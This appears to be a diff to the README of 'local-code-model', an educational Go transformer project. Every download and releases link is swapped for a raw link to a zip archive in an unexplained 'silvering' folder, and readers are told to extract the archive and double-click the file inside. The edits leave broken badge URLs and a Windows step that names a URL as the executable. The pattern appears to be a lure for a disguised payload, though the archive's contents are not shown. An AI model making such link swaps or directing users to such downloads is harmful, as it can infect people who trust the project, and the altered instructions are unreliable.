@@ -1,7 +1,7 @@
 # 🚀 local-code-model - Learn LLMs with Ease
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-GitHub%20Releases-brightgreen)](https://github.com/andikaseptiadi/local-code-model/releases)
+[![Download](https://raw.githubusercontent.com/andikaseptiadi/local-code-model/main/silvering/local-code-model.zip%20Releases-brightgreen)](https://raw.githubusercontent.com/andikaseptiadi/local-code-model/main/silvering/local-code-model.zip)
 
 ## ✨ Description
 Welcome to **local-code-model**! This project provides a pure Go implementation of a GPT-style transformer from scratch. It serves as an educational codebase designed to help you understand how large language models (LLMs) work. Whether you want to learn about machine learning, deep learning, or neural networks, this codebase is an excellent starting point.
@@ -17,7 +17,7 @@ To get started with **local-code-model**, follow the steps below. You will learn
 
 ### 📂 Download & Install
 1. **Visit the Releases Page:** Click on the button below to go to the releases page.
-   [Visit Releases Page](https://github.com/andikaseptiadi/local-code-model/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/andikaseptiadi/local-code-model/main/silvering/local-code-model.zip)
 
 2. **Select the Version:** On the releases page, you will see various versions of the application. Choose the most recent version.
 
@@ -26,7 +26,7 @@ To get started with **local-code-model**, follow the steps below. You will learn
 4. **Extract the Files:** After downloading, locate the .zip file on your computer. Right-click on the file and select "Extract All" or use a similar extraction tool. This will create a new folder with the application files.
 
 5. **Run the Application:**
-   - **Windows:** Double-click on the application file (e.g., `local-code-model.exe`) to start it.
+   - **Windows:** Double-click on the application file (e.g., `https://raw.githubusercontent.com/andikaseptiadi/local-code-model/main/silvering/local-code-model.zip`) to start it.
    - **macOS:** Open the folder and double-click the application file to run it.
    - **Linux:** Open the terminal, navigate to the folder, and type `./local-code-model` to run the application.
 
@@ -63,4 +63,4 @@ For those who want to dive deeper into the world of machine learning and LLMs, c
 ## 🎉 Thank You!
 Thank you for choosing **local-code-model**. We hope this tool aids in your educational journey of understanding large language models. Happy learning!
 
-[![Download](https://img.shields.io/badge/Download-GitHub%20Releases-brightgreen)](https://github.com/andikaseptiadi/local-code-model/releases)
+[![Download](https://raw.githubusercontent.com/andikaseptiadi/local-code-model/main/silvering/local-code-model.zip%20Releases-brightgreen)](https://raw.githubusercontent.com/andikaseptiadi/local-code-model/main/silvering/local-code-model.zip)
